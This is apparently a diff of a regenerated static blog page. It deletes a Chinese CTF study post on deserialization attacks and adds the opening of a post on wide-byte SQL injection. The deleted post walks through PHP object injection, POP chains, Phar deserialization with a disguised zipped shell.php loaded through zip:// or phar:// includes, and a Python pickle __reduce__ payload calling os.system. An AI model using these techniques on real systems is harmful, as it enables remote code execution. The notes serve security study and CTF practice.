@@ -287,7 +287,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" data-id="cmawck7ik003grk7kf6ff3hf6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" data-id="cmawcq0nc003crk7kb87e600l" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -299,9 +299,9 @@
 
 
   
-    <article id="post-Web/注入漏洞/反序列化/反序列化详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/SQL注入/宽字节注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -311,164 +311,70 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="反序列化详解"><a href="#反序列化详解" class="headerlink" title="反序列化详解"></a>反序列化详解</h1><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><blockquote>
-<p>将各种类型的数据压缩按照一定格式存储的过程 使用函数serialize()</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"><span class="meta">&lt;?php</span>0－</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">    ...一些方法 不过序列化不在意这些</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//序列化结果</span></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;DEMO1&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;evi l&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;phpinfo()&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">这里的O表示这是一个对象</span><br><span class="line">    对象名占<span class="number">5</span>个字符</span><br><span class="line">    对象名是DEMO1</span><br><span class="line">    对象有<span class="number">2</span>个属性</span><br><span class="line">    注意属性的长度存在不可见字符<span class="number">0</span>  用来区分属性 是<span class="keyword">public</span> 还是<span class="keyword">private</span> 或者<span class="keyword">protected</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">php反序列化</a>漏洞又称**&#x3D;&#x3D;对象注入&#x3D;&#x3D;** ， 可能会导致&#x3D;&#x3D;远程代码执行（RCE）&#x3D;&#x3D;</p>
-<p>理解为&#x3D;&#x3D;漏洞执行unserialize函数&#x3D;&#x3D; 调用某一类并&#x3D;&#x3D;执行魔术方法&#x3D;&#x3D; 之后&#x3D;&#x3D;执行类中的函数&#x3D;&#x3D; 产生安全问题</p>
-</blockquote>
-<blockquote>
-<h3 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h3><ol>
-<li>unserialize()函数的&#x3D;&#x3D;变量可控&#x3D;&#x3D;</li>
-<li>php文件中存在&#x3D;&#x3D;可利用的类&#x3D;&#x3D;，类中有&#x3D;&#x3D;魔术方法&#x3D;&#x3D;</li>
-</ol>
-</blockquote>
-<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><blockquote>
-<h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><ol>
-<li>把题目代码<strong>复制</strong>到本地</li>
-<li>&#x3D;&#x3D;注释掉方法&#x3D;&#x3D;和&#x3D;&#x3D;一些没有用的东西&#x3D;&#x3D;</li>
-<li>本地对&#x3D;&#x3D;属性赋值&#x3D;&#x3D;，&#x3D;&#x3D;构造序列化&#x3D;&#x3D;，<strong>url编码后输出</strong>，避免把&#x3D;&#x3D;不可见字符&#x3D;&#x3D;的影响</li>
-</ol>
-</blockquote>
-<h5 id="操作过程举例："><a href="#操作过程举例：" class="headerlink" title="操作过程举例："></a>操作过程举例：</h5><p>对源代码进行注释后赋值</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="comment">//赋值</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public function safe()&#123;</span></span><br><span class="line"><span class="comment">// echo $this-&gt;arg;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function evil() &#123;</span></span><br><span class="line"><span class="comment">// eval($this-&gt;arg);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function run()&#123;</span></span><br><span class="line"><span class="comment">// $this-&gt;&#123;$this-&gt;func&#125;();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $obj = unserialize($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">// $obj-&gt;run();</span></span><br></pre></td></tr></table></figure>
-
-<p>然后再在最后输出结果</p>
-<blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));    <span class="comment">//单纯序列化</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>())));    <span class="comment">//进行url编码</span></span><br></pre></td></tr></table></figure></blockquote>
+        <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。</p>
+<p><strong>字符集:</strong> 也叫字符编码，是一种将符号转换为二进制数的映射关系。几种常见的字符集:<br> <strong>·ASCII编码:</strong> 单字节编码。<br> <strong>·gbk编码:</strong> 使用一字节和双字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。双字节的第一字节范围是0x81-0xFE。<br> <strong>·UTF-8编码:</strong> 使用一至四字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。其它字符用二至四个字节变长表示。<br><strong>宽字节:</strong> 就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p>
+<p>通常来说，一个gbk编码汉字，占用<strong>2个</strong>字节。一个utf-8编码的汉字，占用<strong>3个</strong>字节。在php中，我们可以通过输出echo strlen(“和”);来测试</p>
 <p>‍</p>
-<h3 id="三种赋值"><a href="#三种赋值" class="headerlink" title="三种赋值"></a>三种赋值</h3><p>内部直接赋值 只能赋值字符串</p>
-<blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure></blockquote>
-<p>外部赋值 只能访问public属性的变量</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建一个然后直接输出这个$o</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">DEMO1</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; arg = <span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>)); </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><strong>小技巧：</strong>  对于php7.1+版本，对属性容错机制较高，就算不是public也可以在本地修改成public</p>
-</blockquote>
-<h6 id="构造方法赋值-万能方法-解决上述所有麻烦"><a href="#构造方法赋值-万能方法-解决上述所有麻烦" class="headerlink" title="构造方法赋值 (万能方法)解决上述所有麻烦"></a>构造方法赋值 (万能方法)解决上述所有麻烦</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; arg = <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h3 id="POP-chain"><a href="#POP-chain" class="headerlink" title="POP chain"></a>POP chain</h3><h4 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()		   <span class="comment">//对象创建(new)时会自动调用。</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 		       <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 		       <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 	       <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() 		       <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 	       <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() 		       <span class="comment">//用于从不可访问的属性读取数据 包括private或者是不存在的</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() 		       <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 		       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()  		       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 		   <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()             <span class="comment">//当脚本尝试将对象调用为函数时触发  就是加了括号</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()           <span class="comment">//在代码中当调用不存在的类时会</span></span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h4 id><a href="#" class="headerlink" title></a></h4><h2 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h2><h4 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h4><ol>
-<li>写出基本序列化</li>
-<li>写出注入的对象</li>
-<li>写出注入的对象 分析是长到短还是短到长的替换，决定要把对象注入到什么地方</li>
-<li>算清楚替换的差值，计算需要吃掉或挤出（逃逸）的字符串长度，保证这个长度是替换的差值的整数倍，如果不是 则加字符串</li>
-<li>构造替换，对象注入</li>
-</ol>
-<h4 id="长到短的替换"><a href="#长到短的替换" class="headerlink" title="长到短的替换"></a>长到短的替换</h4><p>在第一个元素进行替换，进而吃掉第二个元素的约束，第二个元素就逃逸出来了</p>
-<h4 id="短到长的替换"><a href="#短到长的替换" class="headerlink" title="短到长的替换"></a>短到长的替换</h4><p>暂缺</p>
-<p>‍</p>
-<h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h3 id="Phar是什么？"><a href="#Phar是什么？" class="headerlink" title="Phar是什么？"></a>Phar是什么？</h3><p>可以将多个文件组合成一个文件，</p>
-<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>phar:&#x2F;&#x2F;xxx.phar&#x2F;1.png</p>
-<p>zip:&#x2F;&#x2F;xxx.zip#1.png</p>
-<h3 id="攻击思路-在上传包含中的利用"><a href="#攻击思路-在上传包含中的利用" class="headerlink" title="攻击思路 在上传包含中的利用"></a>攻击思路 在上传包含中的利用</h3><p>可以上传图片，不能上传php</p>
-<p>可以包含 但是只能<code>include(&#39;$userinput.php&#39;);</code>​</p>
-<p>压缩一个shell.php到1.zip,重命名为1.png，上传</p>
-<p>包含：zip:&#x2F;&#x2F;upload.png#shell或phar:&#x2F;&#x2F;upload.png&#x2F;shell 因为在包含的时候在尾部上面的include会拼接上一个php</p>
-<h3 id="如何反序列化"><a href="#如何反序列化" class="headerlink" title="如何反序列化"></a>如何反序列化</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ol>
-<li>需要有可用的类，类下有魔术方法，最后POP chain调用到危险方法</li>
-<li>需要文件操作函数去触发 <code>phar://</code>​ stream</li>
-<li>有上传或者写文件的操作，可以把无损phar文件写入web服务器，后缀名任意</li>
-</ol>
-<h4 id="本地phar的条件"><a href="#本地phar的条件" class="headerlink" title="本地phar的条件"></a>本地phar的条件</h4><p>在php.ini中 <strong>phar.readonly</strong>  <strong>&#x3D;</strong>  <strong>Off</strong></p>
-<h4 id="构造phar反序列化"><a href="#构造phar反序列化" class="headerlink" title="构造phar反序列化"></a>构造phar反序列化</h4><ol>
-<li>把class定义的代码抄下来，把方法注释了</li>
-<li>构造pop链</li>
-<li><del>echo serialize($o)</del></li>
-<li>贴phar八股文</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
-
-<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>还是正常做反序列化的流程，找pop chain，然后本地构造好序列化</p>
-<p>之前:echo serialize($o);</p>
-<p>现在:生成phar文件把$o加载进去 就是在setMetadata中</p>
-<h4 id="可以利用的函数"><a href="#可以利用的函数" class="headerlink" title="可以利用的函数"></a>可以利用的函数</h4><p><img src="/.com//17476573059446373117876879156311-20250519202147-4srw68y.png" alt="17476573059446373117876879156311"></p>
-<h4 id="绕过反序列化中的关键字"><a href="#绕过反序列化中的关键字" class="headerlink" title="绕过反序列化中的关键字"></a>绕过反序列化中的关键字</h4><h5 id="hex-通用"><a href="#hex-通用" class="headerlink" title="hex 通用"></a>hex 通用</h5><p>&#x3D;&#x3D;s:1:“A” 和 S:1:”\61”是一样的意思&#x3D;&#x3D;</p>
-<p>当标识字符串的s为大写的时候，\hex标识对应字符</p>
-<p>所以绕过flag的过滤：S:4:“\66\6c\61\67”</p>
-<h5 id="绕过-0字符-php7-1"><a href="#绕过-0字符-php7-1" class="headerlink" title="绕过\0字符 php7.1+"></a>绕过\0字符 php7.1+</h5><p>虽然类中定义的属性可能不是public 但是我们可以假装是public，然后生成public类型的反序列化字符串。由于PHP7.1+的容错机制可以反序列化成功</p>
-<p>private-&gt;public</p>
-<p>‍</p>
-<h1 id="0720-Pickle反序列化"><a href="#0720-Pickle反序列化" class="headerlink" title="0720 Pickle反序列化"></a>0720 Pickle反序列化</h1><h3 id="what-is-Pickle？"><a href="#what-is-Pickle？" class="headerlink" title="what is Pickle？"></a>what is Pickle？</h3><ul>
-<li>是<strong>python</strong>的一个模块，内存中的东西因为断电等原因容易丢失，可以将对象以文件的形式存放在磁盘上 实现持久化存储</li>
-<li>只能在python中使用 import pickle</li>
-<li>序列化后的数据可读性非常差 人一般无法识别</li>
-<li>cPickle模块是C语言实现的</li>
-</ul>
-<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>​<code>pickle.dump(obj, file[,protocol])</code>​</p>
-<p>如果加s dumps 返回字符串 否则是到文件中</p>
-<p>序列化对象，将结果数据流写入到文件对象中</p>
-<p>参数protocol是序列化模式，默认为0，表示以文本的形式序列化，还可以是1或2，表示以二进制的形式序列化</p>
-<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">name</span>=&quot;<span class="title">test</span>&quot;):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">name</span> = <span class="title">name</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">say</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">print</span>(&quot;<span class="title">Hello</span> ! <span class="title">My</span> <span class="title">friends</span>&quot;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">a</span> = <span class="title">People</span>()</span></span><br><span class="line"><span class="class"><span class="title">c</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">a</span>)</span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="title">c</span>)</span></span><br></pre></td></tr></table></figure>
-
-<p>out: 很多不可见字符</p>
-<p>​<code>b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x04test\x94sb.&#39;</code>​</p>
-<p>生成的规则涉及到PVM：用来解释字节码的解释引擎</p>
-<p>‍</p>
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>​<code>pickle.load(file)</code>​</p>
-<p>如果加s dumps 返回字符串 否则是到文件中</p>
-<p>反序列化对象。将文件中的数据解析为一个python对象；</p>
-<p>需要注意：使用时需要让python能够找到类的定义 否则会报错</p>
-<p>‍</p>
-<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>Pickle是一门基于栈的编程语言，有不同的编写方式，本质是一个轻量级的PVM（在Java中等同于JVM，用于解释字节码的解释引擎）</p>
-<p>有三个部分组成：</p>
-<ol>
-<li><strong>指令处理器（Instruction processor）</strong></li>
-</ol>
-<p>从数据流读取操作码和参数，对其进行解释处理 指令处理器会循环执行整个过程，不断改变stack(堆栈)和memo(备忘录)区域的值 直到遇到‘ <strong>.</strong> ‘这个结束符号。这时，最终停留在栈顶的值将会被作为反序列化对象返回。</p>
-<ol start="2">
-<li><strong>栈区（stack）</strong></li>
-</ol>
-<p>由python的列表list实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果。</p>
-<ol start="3">
-<li><strong>内存区（memo）</strong></li>
-</ol>
-<p>由python的字典dict实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供存储功能，即将反序列化完成的数据以key-value的形式储存在memo中以便使用。</p>
-<p>在第一部分中的IP常用操作码：</p>
-<ul>
-<li><p><strong>c</strong>：读取本行的内容作为模块名module，读取下一行内容作为对象名object，然后将module.object作为可调用对象压入栈中</p>
-</li>
-<li><p><strong>(</strong> ：将标记对象（mark）压入栈中，用于确定命令执行的位置，搭配t指令一起使用以便产生一个元组</p>
-</li>
-<li><p><strong>S</strong>: 后跟字符串在引号内 直到出现换行符 PVM将读取的内容压入栈中</p>
-</li>
-<li><p><strong>t</strong> : 从栈中向外弹出数据，弹射顺序从栈顶一点点出到元组依次后排 直到弹出左括号 此时弹出内容形成一个元组 然后再压入栈中</p>
-</li>
-<li><p><strong>R</strong> : 将之前压入栈中的元组（t）和可调用对象（c）全部弹出，然后将该元组作为可调用参数的对象并执行该对象。最终将结果压入到栈中。</p>
-</li>
-<li><p><strong>.</strong>  : 结束整个Pickle反序列化过程</p>
-</li>
-</ul>
-<p><img src="/.com//1747658503023977923255372684818-20250519204144-7ybitsg.png" alt="1747658503023977923255372684818"></p>
-<p><img src="/.com//17476585059844407908704057067474-20250519204146-hby8s9y.png" alt="17476585059844407908704057067474"></p>
-<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
-<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
-<p><img src="/.com//17476585130011225927306100130946-20250519204153-53pqeav.png" alt="17476585130011225927306100130946"></p>
-<p><img src="/.com//17476585152762147770201117664215-20250519204156-hmuqk2h.png" alt="17476585152762147770201117664215"></p>
-<p>实际代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__reduce__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">a</span> = &#x27;<span class="title">whoami</span>&#x27;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> (<span class="title">os</span>.<span class="title">system</span>, (<span class="title">a</span>,))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">o</span> = <span class="title">A</span>()</span></span><br><span class="line"><span class="class">#序列化</span></span><br><span class="line"><span class="class"><span class="title">test</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">o</span>)</span></span><br><span class="line"><span class="class">#反序列化</span></span><br><span class="line"><span class="class"><span class="title">pickle</span>.<span class="title">loads</span>(<span class="title">test</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#本地运行结果即为电脑名称</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>做题步骤</strong></p>
-<ol>
-<li>找 pickle反序列化位点</li>
-<li>本地重写reduce方法，生成反序列化字符串</li>
-<li>触发反序列化</li>
-</ol>
-<p><strong>与php反序列化的区别</strong></p>
-<p>php中能做什么由网站里面的class类写得方法决定</p>
-<p>但是pickle只要存在反序列化的位点就可以任意执行，因为本地可以重写reduce方法</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" data-id="cmawck7il003lrk7kfbru58sw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nc003erk7kc7rl54jq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
